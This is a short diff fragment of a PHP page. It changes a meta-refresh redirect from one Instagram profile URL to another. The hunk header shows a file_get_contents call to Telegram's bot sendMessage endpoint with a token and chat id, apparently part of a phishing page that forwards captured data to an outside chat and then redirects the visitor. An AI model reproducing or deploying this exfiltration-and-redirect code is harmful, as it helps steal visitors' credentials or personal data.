@@ -5,5 +5,5 @@ file_get_contents("https://api.telegram.org/bot7$token/sendMessage?chat_id=14927
 ?>
 
 <head>
-    <meta http-equiv="refresh" content="3;url=https://www.instagram.com/angelinarequesensestafadora/" />
+    <meta http-equiv="refresh" content="3;url=https://www.instagram.com/apple.com/" />
 </head>
